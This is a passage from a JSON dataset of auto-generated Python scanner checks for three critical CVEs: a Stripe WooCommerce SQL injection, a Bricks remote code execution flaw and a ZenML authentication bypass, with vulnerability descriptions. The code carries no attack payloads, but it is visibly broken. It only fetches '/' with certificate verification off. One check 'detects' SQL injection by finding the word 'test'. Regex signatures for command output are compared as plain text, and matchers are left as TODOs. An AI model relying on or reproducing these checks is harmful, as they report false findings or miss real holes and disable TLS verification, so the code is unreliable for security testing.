        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-0705\nName: Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: Stripe Payment Plugin for WooCommerce for WordPress versions up to 3.7.9 contains a sql_injection caused by insufficient escaping and lack of preparation on 'id' parameter, letting unauthenticated attackers execute arbitrary SQL queries, exploit requires sending crafted 'id' parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_0705:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-0705\"\n    SEVERITY = \"critical\"\n    NAME = \"Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"payment-gateway-stripe\"); status_code == 200 / [OR] DSL: duration >= 6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_0705(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-0705\nName: Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: Stripe Payment Plugin for WooCommerce for WordPress versions up to 3.7.9 contains a sql_injection caused by insufficient escaping and lack of preparation on 'id' parameter, letting unauthenticated attackers execute arbitrary SQL queries, exploit requires sending crafted 'id' parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_0705:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-0705\"\n    SEVERITY = \"critical\"\n    NAME = \"Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body, \"payment-gateway-stripe\"); status_code == 200 / [OR] DSL: duration >= 6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Stripe Payment Plugin for WooCommerce <= 3.7.9 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_0705(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "wp-plugin",
          "wp",
          "wordpress",
          "woocommerce",
          "stripe",
          "sqli",
          "unauth",
          "time-based"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_25600",
        "name": "Unauthenticated Remote Code Execution – Bricks <= 1.9.6",
        "language": "Python",
        "famille": "CVE",
        "description": "Bricks Builder is a popular WordPress development theme with approximately 25,000 active installations. It provides an intuitive drag-and-drop interface for designing and building WordPress websites. Bricks <= 1.9.6 is vulnerable to unauthenticated remote code execution (RCE) which means that anybody can run arbitrary commands and take over the site/server. This can lead to various malicious activities",
        "severity": "critical",
        "detection": "[AND] regex ['Exception:', 'uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)']",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-25600\nName: Unauthenticated Remote Code Execution – Bricks <= 1.9.6\nSeverity: critical\nDescription: Bricks Builder is a popular WordPress development theme with approximately 25,000 active installations. It provides an intuitive drag-and-drop interface for designing and building WordPress websites. Bricks <= 1.9.6 is vulnerable to unauthenticated remote code execution (RCE) which means that anybody can run arbitrary commands and take over the site/server. This can lead to various malicious activities\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_25600:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-25600\"\n    SEVERITY = \"critical\"\n    NAME = \"Unauthenticated Remote Code Execution – Bricks <= 1.9.6\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['Exception:', 'uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)']\"\n\n        # Simple word matcher simulation\n        matchers = ['Exception:', 'uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Unauthenticated Remote Code Execution – Bricks <= 1.9.6\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_25600(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-25600\nName: Unauthenticated Remote Code Execution – Bricks <= 1.9.6\nSeverity: critical\nDescription: Bricks Builder is a popular WordPress development theme with approximately 25,000 active installations. It provides an intuitive drag-and-drop interface for designing and building WordPress websites. Bricks <= 1.9.6 is vulnerable to unauthenticated remote code execution (RCE) which means that anybody can run arbitrary commands and take over the site/server. This can lead to various malicious activities\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_25600:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-25600\"\n    SEVERITY = \"critical\"\n    NAME = \"Unauthenticated Remote Code Execution – Bricks <= 1.9.6\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['Exception:', 'uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)']\"\n\n        # Simple word matcher simulation\n        matchers = ['Exception:', 'uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Unauthenticated Remote Code Execution – Bricks <= 1.9.6\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_25600(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "wpscan",
          "wordpress",
          "wp-plugin",
          "wp",
          "bricks",
          "rce",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_25723",
        "name": "ZenML ZenML Server - Improper Authentication",
        "language": "Python",
        "famille": "CVE",
        "description": "ZenML Server in the ZenML machine learning package before 0.46.7 for Python allows remote privilege escalation because the /api/v1/users/{user_name_or_id}/activate REST API endpoint allows access on the basis of a valid username along with a new password in the request body.",
        "severity": "critical",
        "detection": "[OR] DSL: compare_versions(version, '< 0.46.7'); !contains_any(version, '0.44.4', '0.43.1', '0.42.2')",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-25723\nName: ZenML ZenML Server - Improper Authentication\nSeverity: critical\nDescription: ZenML Server in the ZenML machine learning package before 0.46.7 for Python allows remote privilege escalation because the /api/v1/users/{user_name_or_id}/activate REST API endpoint allows access on the basis of a valid username along with a new password in the request body.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_25723:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-25723\"\n    SEVERITY = \"critical\"\n    NAME = \"ZenML ZenML Server - Improper Authentication\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: compare_versions(version, '< 0.46.7'); !contains_any(version, '0.44.4', '0.43.1', '0.42.2')\"\n\n        # Simple word matcher simulation\n        matchers = ['< 0.46.7', '0.44.4', '0.43.1', '0.42.2']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ZenML ZenML Server - Improper Authentication\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_25723(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, 